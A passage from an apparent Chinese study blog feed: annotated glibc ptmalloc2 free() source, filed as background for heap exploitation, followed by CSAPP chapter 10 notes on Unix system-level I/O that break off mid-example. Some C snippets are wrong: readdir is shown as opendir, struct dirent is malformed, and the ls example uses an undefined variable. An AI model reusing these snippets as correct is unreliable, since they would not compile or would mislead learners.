class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-comment">/* consolidate backward */</span><br>   <span class="hljs-comment">// 如果前一个 prev chunk 也处于释放状态，则用 unlink 合并两个 chunk</span><br>   <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>     prevsize = p-&gt;prev_size;<br>     size += prevsize;<br>     p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>     unlink(av, p, bck, fwd);<br>   &#125;<br><br>   <span class="hljs-comment">// 如果 next chunk 不是 top chunk</span><br>   <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>     <span class="hljs-comment">/* get and clear inuse bit */</span><br>     nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>     <span class="hljs-comment">/* consolidate forward */</span><br>     <span class="hljs-comment">// 如果 next chunk 也处于释放中，则继续向下合并 next chunk</span><br>     <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>unlink(av, nextchunk, bck, fwd);<br>size += nextsize;<br>     &#125; <span class="hljs-keyword">else</span><br>   <span class="hljs-comment">// 清除 inuse 位</span><br>clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br>     <span class="hljs-comment">// 获取当前 unsortedbin 的末尾 chunk 和链表头 chunk</span><br>     bck = unsorted_chunks(av);<br>     fwd = bck-&gt;fd;<br>     <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>&#123;<br>  errstr = <span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>;<br>  <span class="hljs-keyword">goto</span> errout;<br>&#125;<br>     <span class="hljs-comment">// 将当前 chunk 插入 unsortedbin 中</span><br>     p-&gt;fd = fwd;<br>     p-&gt;bk = bck;<br>     <span class="hljs-comment">// 如果 size 不属于 small bin，需要设置 large bin</span><br>     <span class="hljs-keyword">if</span> (!in_smallbin_range(size))<br>&#123;<br>  p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>  p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>&#125;<br>     <span class="hljs-comment">// 更新链表头尾指针</span><br>     bck-&gt;fd = p;<br>     fwd-&gt;bk = p;<br><br>     <span class="hljs-comment">// 设置 chunk 的头部和尾部 prev_size</span><br>     set_head(p, size | PREV_INUSE);<br>     set_foot(p, size);<br><br>     check_free_chunk(av, p);<br>   &#125;<br><br>   <span class="hljs-comment">// 如果当前 chunk 临近 top chunk，则直接合并到 top chunk</span><br>   <span class="hljs-keyword">else</span> &#123;<br>     size += nextsize;<br>     set_head(p, size | PREV_INUSE);<br>     av-&gt;top = p;<br>     check_chunk(av, p);<br>   &#125;<br></code></pre></td></tr></table></figure><p>下面就是一个比较特殊的情况，就是我们如果一下子回收一个 <code>0x10000B</code> 这么大的空间，会回收给系统，这样可以减少资源占用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">// 如果前面释放的 chunk 大小较大，将 fast bin 合并到 unsortedbin 中</span><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;<br>      <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>malloc_consolidate(av);<br><br>      <span class="hljs-comment">// 如果进程的分配区是主分配区，调用 systrim 收缩内存，否则获取非主分配区的 heap_info，用 heap_trim 收缩 heap</span><br>      <span class="hljs-keyword">if</span> (av == &amp;main_arena) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(chunksize(av-&gt;top)) &gt;=<br>    (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(mp_.trim_threshold))<br>  systrim(mp_.top_pad, av);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Always try heap_trim(), even if the top chunk is not</span><br><span class="hljs-comment">   large, because the corresponding heap might go away.  */</span><br>heap_info *heap = heap_for_ptr(top(av));<br><br>assert(heap-&gt;ar_ptr == av);<br>heap_trim(heap, mp_.top_pad);<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! have_lock) &#123;<br>      assert (locked);<br>      (<span class="hljs-type">void</span>)mutex_unlock(&amp;av-&gt;mutex);<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>先调用 <code>malloc_consolidate</code> 合并所有 <code>fast bin</code> 。如果进程所在的分配区是主分配区并且可以收缩内存的话，就调用 <code>systrim</code> 收缩内存，否则就获得非主分配区的 <code>heap_info</code> 指针，调用 <code>heap_trim</code> 收缩 <code>heap</code> 。</p><h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p><code>free</code>不像 <code>malloc</code> 那么复杂，大致上就是属于 <code>fast bin</code> 的直接加入对应链表，不属于 <code>fast bin</code> 的向前合并或者向后合并然后加入 <code>unsorted bin </code> 。如果一次<code>free</code>太多的空间有可能会被操作系统回收。</p><hr><p>这里有对 ptmalloc2 的相关代码的分析：<a href="https://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf">Glibc内存管理 (seebug.org)</a></p><p>这个前半部分的理论讲的比较细，源码分析部分就比较粗略了</p><p>碎碎念：</p><p>计算机发明者和计算机各种语言各种库的发明者好牛，他们的脑子和我的好像是不太一样的🥹</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>libc</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第十章 系统级IO</title>
    <link href="/2023/12/08/CSAPP-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E7%B3%BB%E7%BB%9F%E7%BA%A7IO/"/>
    <url>/2023/12/08/CSAPP-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E7%B3%BB%E7%BB%9F%E7%BA%A7IO/</url>
    
    <content type="html"><![CDATA[<p>I&#x2F;O 不只简单的输入&#x2F;输出</p><span id="more"></span><p>输入&#x2F;输出（I&#x2F;O）是在主存和外部设备（例如磁盘驱动器、终端和网络）之间复制数据的过程。输入操作是从 I&#x2F;O 设备复制数据到主存，而输出操作是从主存复制数据到 I&#x2F;O 设备。</p><p>所有语言的运行时系统都提供执行 I&#x2F;O 的较高级别的工具。例如C语言的 scanf 和 printf，C++ 的 cin 和 cout 。</p><p>在 Linux 系统中，是通过使用由内核提供的系统级 Unix I&#x2F;O 函数来实现这些较高级别的 I&#x2F;O 函数的。</p><h1 id="Unix-I-x2F-O"><a href="#Unix-I-x2F-O" class="headerlink" title="Unix I&#x2F;O"></a>Unix I&#x2F;O</h1><p>我们知道在 Linux 当中，一切皆文件。所有的 IO 设备也都被模型化为文件。输入输出都被当作简单的读写文件，这使得我们所有的输入和输出都可以简单一致的方式去访问：</p><ul><li>打开文件：通过 open 函数打开一个文件，内核会记录有关这个打开文件的所有信息，并向用户层会返回一个<strong>文件描述符</strong>，用户层要操作文件只需要对文件描述符操作即可。</li><li>Linux shell 在创建进程的时候有默认的三个打开的文件：标准输入（stdin），标准输出（stdout），标准错误（stderr），他们的描述符分别为0，1，2。</li><li>改变当前文件的位置：对于每个打开的文件，内核会记录文件所在的位置 k，初始为 0。应用程序可以通过 seek 操作，显示的改变这个值。</li><li>读写文件：读文件就是把文件中从 k 开始到 k+size 的文件内容复制到内存，写文件就是把文件中从 k 开始到 k + size 的文件内容用内存中的某些值替换。</li><li>关闭文件：完成了访问之后，我们应当使用 close 函数去通知内核关闭这个文件，释放系统资源。</li></ul><h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><p>每个Linux文件都有一个类型来表明它在系统中的角色：</p><ul><li>普通文件（regular file）：包含任意数据。应用程序常常要区分文本文件和二进制文件，而对内核而言，文本文件和二进制文件没有区别。</li><li>目录（directory）：是包含一组链接的文件，其中每个链接都将一个文件名映射到一个文件，这个文件可能是另一个目录。每个目录至少包含两个条目：<code>.</code> 是到该目录自身的链接；以及 <code>..</code> 是到目录层次结构中父目录的链接。</li><li>套接字（socket）：是用来与另一个进程进行跨网络通信的文件</li></ul><p>Linux 内核讲所有文件都组织成一个目录层次结构，由名为 <code>/</code> 的根目录确定。系统中每一个文件都是根目录的后代。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E7%B3%BB%E7%BB%9F%E7%BA%A7IO/10-Linux%E7%9B%AE%E5%BD%95%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84.png"></p><p>每个进程都会有一个<strong>当前工作目录</strong>（current working directory）来确定其在目录层次结构中的当前位置。可以用 cd 命令来修改 shell 中的当前工作目录。</p><p>目录层次结构中的位置用<strong>路径名</strong>（pathname）来指定。路径名是一个字符串，包括一个可选斜杠，其后紧跟一系列的文件名，文件名之间用斜杠分隔。路径名有两种形式：</p><ul><li><strong>绝对路径名</strong>（absolute pathname）以一个斜杠开始，表示从根节点开始的路径。例如上图中 hello.c 的绝对路径名为 <strong>&#x2F;home&#x2F;droh&#x2F;hello.c</strong>。</li><li><strong>相对路径名</strong>（relative pathname）以文件名开始，表示从当前工作目录开始的路径。例如，如果 <strong>&#x2F;home&#x2F;droh</strong> 是当前工作目录，那么 <strong>hello.c</strong> 的相对路径名就是 <strong>.&#x2F;hello.c</strong>。反之，如果 <strong>&#x2F;home&#x2F;bryant</strong> 是当前工作目录，那么相对路径名就是 <strong>..&#x2F;home&#x2F;droh&#x2F;hello.c</strong>。</li></ul><h1 id="打开和关闭文件"><a href="#打开和关闭文件" class="headerlink" title="打开和关闭文件"></a>打开和关闭文件</h1><p>进程通过调用 open 函数来打开文件或者创建一个新文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">open</span><span class="hljs-params">(<span class="hljs-type">char</span> *filename, <span class="hljs-type">int</span> flags, <span class="hljs-type">mode_t</span> mode)</span>;<br><br><span class="hljs-comment">// 返回：若成功则为新文件描述符，若出错为 -1。</span><br></code></pre></td></tr></table></figure><p>open 函数将 filename 转换为一个文件描述符，并且返回描述符数字。</p><p>返回的描述符总是在进程中<strong>当前没有打开的最小描述符</strong>。flags 参数指明了进程打算如何访问这个文件：</p><ul><li>O_RDONLY：只读。</li><li>O_WRONLY：只写。</li><li>O_RDWR：可读可写。</li></ul><p>flags 参数也可以按位或更多位掩码，为写提供给一些额外的指示：</p><ul><li>O_CREAT：如果文件不存在，就创建它的一个<strong>截断的</strong>（truncated）（空）文件。</li><li>O_TRUNC：如果文件已经存在，就清空里面的内容。</li><li>O_APPEND：在每次写操作前，设置文件位置到文件的结尾处。</li></ul><p>第三个参数 mode 是我们创建文件时的权限， Linux 的文件权限有 9  位二进制数字组成，因此它也有定义九个宏分别表示这些权限。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E7%B3%BB%E7%BB%9F%E7%BA%A7IO/10-open-mode%E5%AE%8F.png"></p><p>在操作完成后，使用 CLOSE 函数关闭文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#incllude <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">close</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>;<br><br><span class="hljs-comment">//返回，若成功则为0，若出错则为-1</span><br></code></pre></td></tr></table></figure><h1 id="读和写文件"><a href="#读和写文件" class="headerlink" title="读和写文件"></a>读和写文件</h1><p>用用程序使用 read 函数和 write 函数来读写文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> n)</span>;<br><span class="hljs-comment">// 返回：若成功则为读的字节数，若 EOF 则为0，若出错为 -1。</span><br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> n)</span>;<br><span class="hljs-comment">// 返回：若成功则为写的字节数，若出错则为 -1。</span><br></code></pre></td></tr></table></figure><blockquote><p><code>size_t</code> 和 <code>ssize_t</code> 类型的最大区别就是 <code>ssize_t</code> 有符号。</p></blockquote><p>read 函数从描述符为 fd 的当前文件位置复制最多 n 个字节到内存位置 buf 。write 函数从内存位置 buf 复制至多n 个字节到描述符 fd 的当前文件位置。</p><p>在某些情况下，read 和 write 传送的字节比应用程序要求的要少。就会返回不足值，<strong>不足值（short count）并不表示有错误</strong>。出现这样情况的原因有：</p><ul><li><strong>读时遇到 EOF。</strong>假设我们准备读一个文件，该文件从当前文件位置开始只含有 20 多个字节，而我们以 50 个字节的片进行读取。这样一来，下一个 read 返回的不足值为 20，此后的 read 将通过返回不足值 0 来发出 EOF 信号。</li><li><strong>从终端读文本行。</strong>如果打开文件是与终端相关联的（如键盘和显示器），那么每个 read 函数将一次传送一个文本行，返回的不足值等于文本行的大小。</li><li><strong>读和写网络套接字</strong>。如果打开的文件对应于网络套接字，那么内部缓冲约束和较长的网络延迟会引起 read 和 write 返回不值。对 Linux 管道（pipe）调用 read和 write 时，也有可能出现不足值。</li></ul><h1 id="用-RIO-包健壮地读写"><a href="#用-RIO-包健壮地读写" class="headerlink" title="用 RIO 包健壮地读写"></a>用 RIO 包健壮地读写</h1><p>RIO（Robust I&#x2F;O）就是一个 I&#x2F;O 包，它会自动处理上文中提到的不足值。RIO 提供了两类不同的函数：</p><ul><li><strong>无缓冲的输入输出函数</strong>。这些函数直接在内存和文件之间传输数据，没有应用级的缓冲。它们对将二进制数据读写到网络和从网络读写二进制数据尤其有用。</li><li><strong>带缓冲的输入函数</strong>。这些函数允许我们高效地从文件中读取文本行和二进制数据，这些文件的内容缓存在应用级缓冲区内，类似于为 printf 这样的标准 I&#x2F;O 函数提供的缓冲区。</li></ul><blockquote><p>带缓冲的 RIO 输人函数是线程安全的，它在同一个描述符上可以被交错地调用</p></blockquote><h1 id="读取文件元数据"><a href="#读取文件元数据" class="headerlink" title="读取文件元数据"></a>读取文件元数据</h1><p>应用程序能够通过调用 stat 和 fstat 函数，检索到关于文件的信息（有时也称为文件的<strong>元数据</strong>（metadata））。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">stat</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-keyword">struct</span> stat *buf)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fstat</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-keyword">struct</span> stat *buf)</span>;<br><br><span class="hljs-comment">// 返回：若成功则为 0，若出错则为 -1。</span><br></code></pre></td></tr></table></figure><p>stat 函数以文件名作为输入，并填写 stat 数据结构中的各个成员。fstat 以文件描述符作为输入。</p><p>下面是 stat 结构体的详细信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Metadata returned by the stat and fstat functions */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> &#123;</span><br>    <span class="hljs-type">dev_t</span>         st_dev;      <span class="hljs-comment">/* Device */</span><br>    <span class="hljs-type">ino_t</span>         st_ino;      <span class="hljs-comment">/* inode */</span><br>    <span class="hljs-type">mode_t</span>        st_mode;     <span class="hljs-comment">/* Protection and file type */</span><br>    <span class="hljs-type">nlink_t</span>       st_nlink;    <span class="hljs-comment">/* Number of hard links */</span><br>    <span class="hljs-type">uid_t</span>         st_uid;      <span class="hljs-comment">/* User ID of owner */</span><br>    <span class="hljs-type">gid_t</span>         st_gid;      <span class="hljs-comment">/* Group ID of owner */</span><br>    <span class="hljs-type">dev_t</span>         st_rdev;     <span class="hljs-comment">/* Device type (if inode device) */</span><br>    <span class="hljs-type">off_t</span>         st_size;     <span class="hljs-comment">/* Total size, in bytes */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> st_blksize;  <span class="hljs-comment">/* Block size for filesystem I/O */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> st_blocks;   <span class="hljs-comment">/* Number of blocks allocated */</span><br>    <span class="hljs-type">time_t</span>        st_atime;    <span class="hljs-comment">/* Time of last access */</span><br>    <span class="hljs-type">time_t</span>        st_mtime;    <span class="hljs-comment">/* Time of last modification */</span><br>    <span class="hljs-type">time_t</span>        st_ctime;    <span class="hljs-comment">/* Time of last change */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>stat 结构体定义在 <code>sys/stat.h</code> 头文件中。</p><p>st_size 成员包含了文件的字节数大小。st_mode 成员则编码了文件访问许可位和文件类型。</p><p>Linux 在 sys&#x2F;stat.h 中定义了宏谓词来确定 st_mode 成员的文件类型：</p><ul><li>**S_ISREG(m)**。这是一个普通文件吗？</li><li>**S_ISDIR(m)**。这是一个目录文件吗？</li><li>**S_ISSOCK(m)**。这是一个网络套接字吗？</li></ul><p>我们可以通过读取 st_mode 成员来判断文件类型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">s</span>;</span><br>    <span class="hljs-type">char</span> *type, *readok;<br>    stat(argv[<span class="hljs-number">1</span>], &amp;s);<br>    <span class="hljs-keyword">if</span> (S_ISREG(s.st_mode))     <span class="hljs-comment">/* Determine file type */</span><br>        type = <span class="hljs-string">&quot;regular&quot;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (S_ISDIR(s.st_mode))<br>        type = <span class="hljs-string">&quot;directory&quot;</span>;<br>    <span class="hljs-keyword">else</span><br>        type = <span class="hljs-string">&quot;other&quot;</span>;<br>    <span class="hljs-keyword">if</span> ((s.st_mode &amp; S_IRUSR))  <span class="hljs-comment">/* Check read access */</span><br>        readok = <span class="hljs-string">&quot;yes&quot;</span>;<br>    <span class="hljs-keyword">else</span><br>        readok = <span class="hljs-string">&quot;no&quot;</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;type: %s, read: %s\n&quot;</span>, type, readok);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="读取目录内容"><a href="#读取目录内容" class="headerlink" title="读取目录内容"></a>读取目录内容</h1><p>打开：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dirent.h&gt;</span></span><br><br>DIR *<span class="hljs-title function_">opendir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;<br><br><span class="hljs-comment">// 返回：若成功，则为处理的指针；若出错，则为 NULL。</span><br></code></pre></td></tr></table></figure><p>读：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dirent.h&gt;</span></span><br><br>DIR *<span class="hljs-title function_">opendir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;<br><span class="hljs-comment">// 返回：若成功则为处理的指针，若出错则为 NULL。</span><br></code></pre></td></tr></table></figure><p>每次对 readdir 的调用返回的都是指向流 dirp 中下一个目录项的指针；或者，如果没有更多目录项则返回 NULL。每个目录项都是一个结构，其形式如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> &#123;</span><br>    <span class="hljs-type">ino_t</span> d_ino;<span class="hljs-comment">/* inode number */</span><br>    d_name[<span class="hljs-number">256</span>]; <span class="hljs-comment">/* Filename */</span><span class="hljs-type">char</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>关闭：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dirent.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">closedir</span><span class="hljs-params">(DIR *dirp)</span>;<br><br><span class="hljs-comment">// 返回：成功为 0；错误为 -1。</span><br></code></pre></td></tr></table></figure><p>我们可以用上面的三个函数写一个类似于 Linux 系统的 ls 命令的功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;dirent.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DIR</span> *<span class="hljs-title">stream</span> =</span> opendir(<span class="hljs-string">&quot;/etc/&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> *<span class="hljs-title">dep</span>;</span><br><span class="hljs-keyword">while</span>((dep=readdir(d))!=<span class="hljs-literal">NULL</span>)<br>    &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,dep-&gt;d_name);<br>&#125;<br>    closedir(stream);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="共享文件"><a href="#共享文件" class="headerlink" title="共享文件"></a>共享文件</h1><p>内核用三个相关的数据结构来表示它打开的文件：</p><ul><li><p><strong>描述符表</strong>：进程之间独立，每个打开的文件描述符表项指向文件表中的一个表项。</p></li><li><p><strong>文件表</strong>：所有进程之间共享。每个表项的组成包括了文件位置、引用计数、以及指向<strong>v-node 表项</strong>对应的指针。每关闭一个描述符会减少相应的文件表项中的引用计数，当引用计数为 0 也就是所有进程都关闭了这个文件时，内核会删除这个表项。</p></li><li><p><strong>v-node 表</strong>：所有进程共享，里面的一个表项包含了 stat 结构信息以及其它一些额外的字段。</p></li></ul><p>下图描述符1和 4 通过不同的打开文件表项来引用不同的文件，例如进程中分别调用一次 open 函数和一次 write 函数。需要注意的是，打开文件表中的引用计数仅仅在 fork 的时候会增加。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E7%B3%BB%E7%BB%9F%E7%BA%A7IO/10-%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84.png"></p><p>如果以同一个文件调用 open 函数两次，就会发生下图这种情况。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E7%B3%BB%E7%BB%9F%E7%BA%A7IO/10-%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6.png"></p><p>父子进程之间 fork 时如下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E7%B3%BB%E7%BB%9F%E7%BA%A7IO/10-%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6fork.png"></p><h1 id="I-x2F-O-重定向"><a href="#I-x2F-O-重定向" class="headerlink" title="I&#x2F;O 重定向"></a>I&#x2F;O 重定向</h1><p>Linuxshell 提供了 I&#x2F;O 重定向操作符，允许用户将磁盘文件和标准输入输出联系起来。例如，键入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">linux&gt; </span><span class="language-bash"><span class="hljs-built_in">ls</span> &gt; 